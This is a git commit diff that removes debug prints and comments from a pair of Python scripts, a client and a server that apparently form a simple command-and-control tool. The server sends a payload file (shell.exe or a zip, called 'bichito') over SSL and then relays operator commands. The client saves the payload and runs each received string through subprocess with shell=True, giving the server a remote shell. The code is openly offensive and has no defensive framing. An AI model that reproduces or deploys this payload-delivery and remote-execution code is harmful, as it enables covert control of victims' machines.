d323546b00e0e9b202751d989041e530085c1793
B0rjitaaa <bmcx12@gmail.com>
2018-03-16 21:37:58 +0100

    Removed comments.

--- client__ssl.py
+++ client__ssl.py
@@ -10,44 +10,33 @@ def get_json_data(json_file):
 
 
 def echo_get_exploit(s):
-    print('la0')
+    # accum for breaking the reception of the exploit
     a = 0
-    with open('shell2_NEW.zip', 'wb') as f:
+    with open('shell2_NEW_new_new.zip', 'wb') as f:
         print ('file opened')
         while True:
             print('receiving data...')
             data = s.recv(8192)
-            # print('data=%s', (data))
             if not data:
                 break
             # write data to a file
             f.write(data)
             a += 1
-            print ('la a: ', a)
             if a == 6:
-                print('olaaaaa')
                 break
-        print('se fue')
-    # f.close()
-    #echo_client(s)
-    # s.close()
     echo_client(s)
-    # exit(2)
 
 
 def echo_client(s):
-    print('entra')
     while True:
         data = s.recv(8192)
         print(data.decode("utf-8"))
         response = subprocess.check_output(data, shell=True)
-        # encoded = encode(response)
-        # s.send(encoded)
         print(response)
         if data == b'':
             break
         s.send(b'This is a response.')
-        print('Connection closed')
+    print('Connection closed')
     s.close()
 
 
@@ -62,7 +51,6 @@ def main():
         ssl_sock = ssl.wrap_socket(s,cert_reqs=ssl.CERT_REQUIRED, ca_certs='cert')
         ssl_sock.connect((config_data['ip'], config_data['port']))
         echo_get_exploit(ssl_sock)
-        # echo_client(ssl_sock)
         ssl_sock.close()
 
 
--- server__ssl.py
+++ server__ssl.py
@@ -44,7 +44,6 @@ def echo_client(s):
 def open_encode_bichito(file_name='shell.exe'):
     # create_bichito()
     bichito = open(file_name, 'rb')
-    # return encode(file.read())
     return bichito
 
 
@@ -68,27 +67,25 @@ def send_bichito(address):
                 filename='shellkali__.zip'
                 f = open(filename,'rb')
                 l = f.read(8192)
+
                 while (l):
                     c.send(l)
                     l = f.read(8192)
                 f.close()
-                # c.write(str(input("Enter Something: ")).encode())
+
                 break
             print('Bichito sent')
-            # return 1  esto seria conveniente para seguir con el siguiente comando abajo
-            # break este break rompe todo
+
             while 1:
                 c.write(str(input("Enter Something: ")).encode())
             echo_client(c)
-            # echo_server(address)
+
         except socket.error as e:
             print('Error: {0}'.format(e))
-    print('Perra')
 
 
 
 def echo_server(address):
-    # si se llama este.... pues deberia comentarse la conexion y asi no explota
     s = socket.socket(AF_INET, SOCK_STREAM)
     s.bind(address)
     s.listen(1)
@@ -113,9 +110,8 @@ def echo_server(address):
 def main():
     create_config_file_json()
     config_data = get_json_data('config_w.json')
-    print('lo ves')
     send_bichito((socket.gethostbyname(config_data['ip']), config_data['port']))
-    #echo_server((socket.gethostbyname(config_data['ip']), config_data['port']))
+
 
 
 if __name__ == "__main__":
